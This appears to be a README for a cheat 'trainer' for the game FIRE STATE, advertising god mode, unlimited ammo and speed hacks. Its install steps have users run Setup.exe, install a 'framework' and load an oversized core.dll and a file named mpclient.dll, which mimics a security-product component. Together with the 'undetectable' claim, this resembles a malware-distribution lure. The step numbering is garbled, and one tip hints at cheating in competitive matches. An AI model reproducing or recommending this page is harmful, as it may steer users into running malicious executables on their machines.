## 🔥 Project Overview

**This tool** is a comprehensive trainer for **FIRE STATE**. This trainer provides optional single-player and offline gameplay assistance for FIRE STATE, including health protection, ammunition support, faster movement, and weapon handling enhancements. It is designed for experimenting with the game's tactical firefights without changing its bodycam-style presentation or core shooting systems.

**Target Audience:** Players who want to explore FIRE STATE's tactical shooting, bodycam-style environments, and weapon handling in private or offline sessions with adjustable difficulty and convenience options.

> **⚠️ IMPORTANT:** This tool is for **educational and private use only**. It does not modify any game files — all changes are temporary and reset when the game closes. The tool is **undetectable**, but **use it at your own risk**. Always back up your save files before use.

### Step 3: Extract All Files

1. Extract **all files** from the archive to a folder of your choice.

3. The folder structure should look like this:

|

|-- core.dll <- Core framework (115 MB)

|-- mpclient.dll <- Client module (7 MB)
|-- config.ini <- Configuration file (966 KB)

### Step 4: Launch the Tool

2. Run `Setup.exe`.
3. The launcher window will appear.

### Step 5: Install Framework

1. In the launcher window, click **"Install Framework"**.
2. Wait for the confirmation message *"Framework successfully installed"*.

### Step 6: Launch the Game

2. In-game, press the configured hotkey to open the main control menu.

## 📖 Detailed Feature Guide

### Movement & Exploration

Enable Movement Speed only when you need faster repositioning or want to test different traversal speeds. Return the value to normal before entering a competitive match.

### Tools & Inventory

FIRE STATE's documented core gameplay focuses on weapons, maps, and multiplayer combat rather than a conventional loot-based inventory. The trainer does not add or alter inventory items; ammunition assistance applies to supported firearms.

### World & Environment

Explore FIRE STATE's playable 3DGS environments carefully and use the trainer in private sessions to study sightlines, environmental interaction, and tactical positions without the usual combat pressure.

### Combat & Weapons

Activate health protection, ammunition support, or weapon-handling options before entering a firefight. Use Reduced Recoil and Steady Aim to practice marksmanship, while Unlimited Ammunition and No Reload are best suited to controlled testing sessions.
